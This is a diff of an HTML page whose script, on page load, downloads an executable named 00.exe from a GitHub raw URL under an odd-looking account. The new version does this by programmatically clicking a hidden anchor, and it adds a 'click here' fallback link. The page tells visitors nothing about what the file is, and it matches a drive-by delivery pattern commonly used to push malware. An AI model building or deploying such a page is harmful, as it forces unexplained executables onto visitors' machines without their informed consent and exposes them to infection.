@@ -3,39 +3,30 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Automatic File Download</title>
+    <title>Auto Download</title>
     <script>
-        function downloadFile(url, filename) {
-            fetch(url)
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error(`HTTP error! status: ${response.status}`);
-                    }
-                    return response.blob(); // Get the file data as a Blob
-                })
-                .then(blob => {
-                    const link = document.createElement('a');
-                    link.href = URL.createObjectURL(blob); // Create a URL for the Blob
-                    link.download = filename; // Set the filename for the download
-                    document.body.appendChild(link); // Append the link to the DOM
-                    link.click(); // Trigger the download
-                    document.body.removeChild(link); // Clean up the DOM
-                })
-                .catch(error => {
-                    console.error('Error downloading file:', error);
-                });
-        }
+        window.onload = function() {
+            // Define the file URL
+            const fileUrl = "https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe";
 
-        // Automatically download the file when the page loads
-        window.addEventListener('load', function () {
-            const fileUrl = 'https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe';
-            const fileName = '00.exe'; // Suggested filename for the downloaded file
-            downloadFile(fileUrl, fileName);
-        });
+            // Create an anchor element
+            const anchor = document.createElement('a');
+            anchor.href = fileUrl;
+            anchor.download = ""; // This suggests a download rather than opening in-browser
+
+            // Append the anchor to the body (required for Firefox)
+            document.body.appendChild(anchor);
+
+            // Programmatically click the anchor
+            anchor.click();
+
+            // Remove the anchor from the body
+            document.body.removeChild(anchor);
+        };
     </script>
 </head>
 <body>
-    <h1>Downloading File...</h1>
-    <p>If the download does not start automatically, please check your browser settings.</p>
+    <h1>Preparing Download...</h1>
+    <p>If the download does not start automatically, <a href="https://github.com/hubertloudgfdxgx/krc/raw/refs/heads/main/00.exe" download>click here</a>.</p>
 </body>
 </html>
